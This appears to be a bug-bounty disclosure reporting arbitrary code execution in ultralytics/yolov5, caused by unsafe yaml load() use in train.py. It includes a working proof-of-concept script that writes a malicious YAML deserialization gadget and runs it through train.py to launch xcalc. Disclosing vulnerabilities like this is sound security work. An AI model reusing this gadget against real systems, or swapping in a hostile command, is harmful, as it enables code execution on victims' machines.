# Description
**Arbitrary Code Excecution** in ultralytics/yolov5.
Yolov5 is a Object Detection model from Ultralytics. Ultralytics is a U.S.-based particle physics and AI startup with over 6 years of expertise supporting government, academic and business clients. Ultralytics offer a wide range of vision AI services, spanning from simple expert advice up to delivery of fully customized, end-to-end production solutions.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**. **NOTE : ** the fix iis to be done in **train.py**
# Exploit code
**Python File**
```python
import os
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
os.system('git clone https://github.com/ultralytics/yolov5.git')
os.chdir('yolov5/')
os.system('rm exploit.yml')
open('exploit.yml','w+').write(exploit)
os.system('python train.py --data exploit.yml --cfg exploit.yml --weights "" --batch-size 24')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/786931254032334868/Screenshot_from_2020-12-11_17-50-56.png)
